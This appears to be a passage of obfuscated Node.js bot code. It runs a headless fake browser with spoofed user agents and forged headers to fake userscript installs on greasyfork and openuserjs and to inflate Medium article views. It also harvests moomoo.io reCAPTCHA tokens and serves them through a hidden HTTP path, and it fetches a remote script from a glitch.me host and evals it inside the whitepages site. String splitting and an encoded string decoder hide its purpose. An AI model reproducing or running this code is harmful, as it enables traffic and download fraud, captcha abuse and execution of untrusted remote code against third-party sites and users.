      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + a0(0x1c),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': a0(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x8)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + a0(0x20) + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + a0(0x14) + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x3 * 0x239 + -0x1 * -0x7b + -0x726
  };

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x7d6 * 0x1 + -0x1 * 0x1000 + 0x82a);
    let h = e[f];
    if (b['PByHoV'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xe7d + -0x2 * 0x114 + 0x10a5, s, t, u = -0x5 * -0x442 + -0x239 * 0xb + -0x1 * -0x329; t = n['charAt'](u++); ~t && (s = r % (0x7 * -0x87 + 0xb22 + -0x1 * 0x76d) ? s * (0xf * -0x21b + -0xd51 + 0x2d26 * 0x1) + t : t, r++ % (-0xa * -0x31 + 0x216b + -0x2351)) ? p += String['fromCharCode'](-0x1 * -0x1c53 + 0x5 * -0x17d + -0x6a1 * 0x3 & s >> (-(-0x13f1 + 0x9 * -0x3d0 + 0x1d * 0x1df) * r & 0x1903 + 0x480 + -0x1d7d)) : -0x2066 + -0x195 * 0x12 + -0x8 * -0x79c) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1e6f + -0x13e8 + 0x3257, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x13f1 + 0x1416 + -0xd * 0x313))['slice'](-(-0x221 * 0xb + 0x7b5 * -0x1 + 0x1f22));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x160 * 0x16 + 0x1373 + -0x31b3,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x79a + 0xc89 * -0x1 + 0x3 * 0x1a5; u < -0x18b6 + 0xd * 0x1f5 + 0x17 * 0x3; u++) {
          p[u] = u;
        }
        for (u = 0x13f8 + -0x1eda + 0x1 * 0xae2; u < -0x156b * -0x1 + -0x20fe + 0xc93; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x293 * -0xd + -0x1 * -0x871 + -0x2 * -0xd03), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1072 + 0xc22 * -0x3 + 0x59 * 0x98, q = -0x3 * 0xcdb + -0x195e + -0x4eb * -0xd;
        for (let v = 0x109d * 0x1 + -0x95d + 0x20 * -0x3a; v < n['length']; v++) {
          u = (u + (0x11c5 + 0x190b * -0x1 + -0x9 * -0xcf)) % (0xb03 * -0x1 + 0x1b3b * 0x1 + 0x1 * -0xf38), q = (q + p[u]) % (-0x667 * -0x3 + -0xa9c + -0x799), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x1521 + 0x116 * -0x9 + -0xa5b)]);
        }
        return t;
      };
      b['ZOsMBt'] = m, c = arguments, b['PByHoV'] = !![];
    }
    const j = e[-0xb9f + 0x1779 + -0xbda],
      k = f + j,
      l = c[k];
    return !l ? (b['CvqbUm'] === undefined && (b['CvqbUm'] = !![]), h = b['ZOsMBt'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2 * 0x217 + 0x156f + -0x199d)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x206d * 0x1 + -0x7f1 + 0x18 * -0x101), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xaf1 * -0x1 + -0x14f + 0xca4), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xaa * -0x5 + -0x2005 * 0x1 + 0x2357;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x5c9 + -0x1 * 0x16c2 + 0x10f9 * 0x1; w < getRandomInt(-0x1fac + -0x183f + -0x37ec * -0x1, 0xbd5 + -0x1 * -0x2663 + -0x3233 * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xb383 * -0x2 + -0x1 * 0x101ce + 0x2f4a * 0x12);
        }
      }();
    }, 0x2 * -0x1023 + -0x3e * 0x74 + 0x3cc2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1818 + -0x47d * -0x1 + 0x139b;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x5c9 + -0x3 * 0x7a9 + -0x1 * -0x1132, 0x15e * 0x14 + 0x1 * -0x44 + 0x1 * -0x1ae2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x27 * -0x531 + 0x410c + -0x9653);
    }, 0x2 * -0xdcd + -0x44c + 0x204a), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1f31 + -0x1070 * -0x1 + -0xec1 * -0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x958 * 0x4 + 0xdf * -0x17 + -0x11 * -0x411), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xdf4 + -0x7 * 0x541 + 0x16d3), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x4661 * 0x1b + 0x154b49 + 0x1 * -0x236e);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x369 + -0x1 * -0x437 + 0x6a * -0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a1 = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x21c3 + -0x8ef + -0x2 * -0x15bd);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || a1(0xa, 'oFEw') + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3032 + 0x2cc + 0x267b * 0x2);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a2 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x10b3 + 0x142 * 0x1 + -0x11f4) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x8 * -0x36d + -0x728 * 0x2 + 0x45d * -0x3));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x688 + 0x319 + 0x36f, D['indexOf']('\x20'));
        return B ? E['slice'](0x9d6 + -0x3bf * 0x5 + 0x17 * 0x63, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xbb * 0x53 + -0x23cd + 0xe3c),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x4 * 0xada + 0x9 * -0x192 + 0x9ca),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': a2(0x5) + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': a2(0x2)
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
